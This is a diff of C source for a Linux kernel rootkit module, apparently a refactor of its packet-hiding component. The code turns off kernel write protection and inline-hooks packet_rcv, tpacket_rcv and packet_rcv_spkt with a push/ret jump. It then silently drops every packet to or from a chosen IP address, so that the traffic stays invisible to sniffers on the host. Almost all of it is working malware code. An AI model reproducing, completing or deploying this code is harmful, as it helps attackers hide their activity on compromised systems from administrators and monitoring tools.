@@ -19,30 +19,37 @@ int manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, st
 
 
 /* the functions that are being hooked */
-int (*fn_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)      = (void*) sysmap_packet_rcv;
-int (*fn_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void*) sysmap_packet_rcv_spkt;
-int (*fn_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)     = (void*) sysmap_tpacket_rcv;
+int (*packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv;
+int (*packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv_spkt;
+int (*tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_tpacket_rcv;
 
-unsigned int host_ip = 0;
-spinlock_t pack_lock;
-unsigned long flags;
+/* the ip to be hidden */
+static unsigned int hidden_ip = 0;
 
-char jump_code[JUMP_CODE_SIZE] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
-unsigned int *jump_addr = (unsigned int *) (jump_code + 1);
+/* spinlocks for each function we hook */
+spinlock_t packet_rcv_lock;
+unsigned long packet_rcv_flags;
+spinlock_t tpacket_rcv_lock;
+unsigned long tpacket_rcv_flags;
+spinlock_t packet_rcv_spkt_lock;
+unsigned long packet_rcv_spkt_flags;
+
+char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
+unsigned int *target = (unsigned int *) (hook + 1);
 
 /* code of the original functions that has been overwritten by us */
-char original_code_packet_rcv[JUMP_CODE_SIZE];
-char original_code_tpacket_rcv[JUMP_CODE_SIZE];
-char original_code_packet_rcv_spkt[JUMP_CODE_SIZE];
+char original_packet_rcv[6];
+char original_tpacket_rcv[6];
+char original_packet_rcv_spkt[6];
 
 /* Check if we need to hide this perticular packet */
 int
 is_packet_hidden (struct sk_buff *skb)
 {
 	if (skb->protocol == htons(ETH_P_IP)) {
-		struct iphdr* iph = (struct iphdr*) skb_network_header(skb);
+		struct iphdr* iphdr = (struct iphdr*) skb_network_header(skb);
 
-		if (iph->saddr == host_ip || iph->daddr == host_ip){
+		if (iphdr->saddr == hidden_ip || iphdr->daddr == hidden_ip){
 			return 1;
 		}
 	}	
@@ -52,104 +59,104 @@ is_packet_hidden (struct sk_buff *skb)
 void
 hook_packet_rcv (void)
 {
-	spin_lock_irqsave(&pack_lock, flags);
+	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 
 	/* disable write protection */
 	disable_page_protection();
 	
-	*jump_addr = (unsigned int *) manipulated_packet_rcv;
-	memcpy(original_code_packet_rcv, fn_packet_rcv, JUMP_CODE_SIZE);
-	memcpy(fn_packet_rcv, jump_code, JUMP_CODE_SIZE);
+	*target = (unsigned int *) manipulated_packet_rcv;
+	memcpy(original_packet_rcv, packet_rcv, 6);
+	memcpy(packet_rcv, hook, 6);
 	
 	/* reenable write protection */
 	enable_page_protection();
 
-	spin_unlock_irqrestore(&pack_lock, flags);
+	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 }
 
 void
 hook_tpacket_rcv (void)
 {
-	spin_lock_irqsave(&pack_lock, flags);
+	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 
 	/* disable write protection */
 	disable_page_protection();
 	
-	*jump_addr = (unsigned int *) manipulated_tpacket_rcv;
-	memcpy(original_code_tpacket_rcv, fn_tpacket_rcv, JUMP_CODE_SIZE);
-	memcpy(fn_tpacket_rcv, jump_code, JUMP_CODE_SIZE);
+	*target = (unsigned int *) manipulated_tpacket_rcv;
+	memcpy(original_tpacket_rcv, tpacket_rcv, 6);
+	memcpy(tpacket_rcv, hook, 6);
 	
 	/* reenable write protection */
 	enable_page_protection();
 
-	spin_unlock_irqrestore(&pack_lock, flags);
+	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 }
 
 void
 hook_packet_rcv_spkt (void)
 {
-	spin_lock_irqsave(&pack_lock, flags);
+	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 
 	/* disable write protection */
 	disable_page_protection();
 	
-	*jump_addr = (unsigned int *) manipulated_packet_rcv_spkt;
-	memcpy(original_code_packet_rcv_spkt, fn_packet_rcv_spkt, JUMP_CODE_SIZE);
-	memcpy(fn_packet_rcv_spkt, jump_code, JUMP_CODE_SIZE);
+	*target = (unsigned int *) manipulated_packet_rcv_spkt;
+	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 6);
+	memcpy(packet_rcv_spkt, hook, 6);
 	
 	/* reenable write protection */
 	enable_page_protection();
 
-	spin_unlock_irqrestore(&pack_lock, flags);
+	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 }
 
 void
-restore_packet_rcv (void)
+unhook_packet_rcv (void)
 {
-	spin_lock_irqsave(&pack_lock, flags);
+	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 	
 	/* disable write protection */
 	disable_page_protection();
 
-	memcpy(fn_packet_rcv, original_code_packet_rcv, JUMP_CODE_SIZE); //TODO
+	memcpy(packet_rcv, original_packet_rcv, 6);
 
 	/* reenable write protection */
 	enable_page_protection();
 
-	spin_unlock_irqrestore(&pack_lock, flags);
+	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 }
 
 void
-restore_tpacket_rcv (void)
+unhook_tpacket_rcv (void)
 {
-	spin_lock_irqsave(&pack_lock, flags);
+	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 	
 	/* disable write protection */
 	disable_page_protection();
 
-	memcpy(fn_tpacket_rcv, original_code_tpacket_rcv, JUMP_CODE_SIZE); //TODO
+	memcpy(tpacket_rcv, original_tpacket_rcv, 6);
 
 	/* reenable write protection */
 	enable_page_protection();
 
-	spin_unlock_irqrestore(&pack_lock, flags);
+	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 }
 
 
 void
-restore_packet_rcv_spkt (void)
+unhook_packet_rcv_spkt (void)
 {
-	spin_lock_irqsave(&pack_lock, flags);
+	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	
 	/* disable write protection */
 	disable_page_protection();
 
-	memcpy(fn_packet_rcv_spkt, original_code_packet_rcv_spkt, JUMP_CODE_SIZE); 
+	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6); 
 
 	/* reenable write protection */
 	enable_page_protection();
 
-	spin_unlock_irqrestore(&pack_lock, flags);
+	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 }
 
 int
@@ -159,48 +166,48 @@ manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct pack
 	
 	if(is_packet_hidden(skb))
 	{	
-		ROOTKIT_DEBUG("Dropped the packet in 1"); 
+		ROOTKIT_DEBUG("Dropped the packet in 'packet_rcv'.\n"); 
 		return 0; 
 	}
 
-	restore_packet_rcv();
-	ret = fn_packet_rcv(skb,dev,pt,orig_dev);
+	unhook_packet_rcv();
+	ret = packet_rcv(skb,dev,pt,orig_dev);
 	hook_packet_rcv();
 	
 	return ret;	
 }
 
 int
-manipulated_tpacket_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
+manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
 	
 	if(is_packet_hidden(skb))
 	{	
-		ROOTKIT_DEBUG("Dropped the packet in 2"); 
+		ROOTKIT_DEBUG("Dropped the packet in 'tpacket_rcv'.\n"); 
 		return 0; 
 	}
 
-	restore_tpacket_rcv();
-	ret = fn_tpacket_rcv(skb,dev,pt,orig_dev);
+	unhook_tpacket_rcv();
+	ret = tpacket_rcv(skb,dev,pt,orig_dev);
 	hook_tpacket_rcv();
 	
 	return ret;	
 }
 
 int
-manipulated_packet_rcv_spkt(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
+manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
 	int ret;
 	
 	if(is_packet_hidden(skb))
 	{	
-		ROOTKIT_DEBUG("Dropped the packet in 3"); 
+		ROOTKIT_DEBUG("Dropped the packet in 'packet_rcv_spkt'.\n"); 
 		return 0; 
 	} 
 
-	restore_packet_rcv_spkt();
-	ret = fn_packet_rcv_spkt(skb,dev,pt,orig_dev);
+	unhook_packet_rcv_spkt();
+	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
 	hook_packet_rcv_spkt();
 	
 	return ret;	
@@ -210,11 +217,12 @@ manipulated_packet_rcv_spkt(struct sk_buff* skb, struct net_device* dev, struct 
 void
 load_packet_hiding (char *ipv4_addr)
 {
-        ROOTKIT_DEBUG("Loading packet hiding... bye!\n");
-	
 	u8 dst[4];
-	int ret = in4_pton(ipv4_addr, -1, dst, -1, NULL); // Use the same function for convert into integer
-	host_ip = *(unsigned int *)dst; 
+        
+	ROOTKIT_DEBUG("Loading packet hiding... bye!\n");
+	
+	in4_pton(ipv4_addr, -1, dst, -1, NULL); // Use the same function for convert into integer
+	hidden_ip = *(unsigned int *)dst; 
 	
 	hook_packet_rcv();
 	hook_tpacket_rcv();
@@ -229,9 +237,9 @@ unload_packet_hiding (void)
 {
         ROOTKIT_DEBUG("Unloading packet hiding... bye!\n");
 
-	restore_packet_rcv();
-	restore_tpacket_rcv();
-	restore_packet_rcv_spkt();
+	unhook_packet_rcv();
+	unhook_tpacket_rcv();
+	unhook_packet_rcv_spkt();
 
 	ROOTKIT_DEBUG("Done.\n");
 }
